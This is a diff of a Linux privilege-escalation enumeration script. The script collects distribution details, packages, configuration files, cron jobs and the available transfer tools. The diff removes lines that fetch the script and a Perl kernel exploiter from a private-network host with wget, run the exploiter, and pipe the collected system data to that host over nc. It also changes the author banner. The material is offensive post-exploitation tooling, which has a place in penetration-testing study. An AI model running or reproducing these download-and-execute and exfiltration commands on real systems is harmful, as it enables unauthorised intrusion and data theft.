@@ -1,8 +1,5 @@
 #!/bin/sh
-echo "-[Linux Privilege Escalation Script v2 by nonXero]=--"
-echo ""
-echo "To use, run wget http://192.168.16.151/tmp/privesc/linux_privesc.sh on remote host"
-echo "Then run, sh linux_privesc.sh | nc -vv 192.168.16.151 443 to transfer log to remote host"
+echo "+ - --=[Linux Privilege Escalation Script by 1N3@CrowdShield - https://crowdshield.com"
 echo ""
 echo "Whats the distribution type? What version?"
 echo "#####################################################################"
@@ -28,10 +25,10 @@ echo "#####################################################################"
 dpkg -l
 rpm -qa
 echo ""
-#echo "#####################################################################"
-#echo "Find configuration files for services..."
-#find /etc/ -name *.conf
-#echo ""
+echo "#####################################################################"
+echo "Find configuration files for services..."
+find /etc/ -name *.conf
+echo ""
 echo "What jobs are scheduled?"
 echo "#####################################################################"
 crontab -l
@@ -115,9 +112,5 @@ which scp
 which ftp
 which tftp
 echo ""
-echo "Searching for local exploits..."
-wget "http://192.168.16.151/tmp/privesc/linux_kernel_exploiter.pl" 2> /dev/null
-perl linux_kernel_exploiter.pl
-echo "#####################################################################"
 echo "#####################################################################"
 echo "Done!"
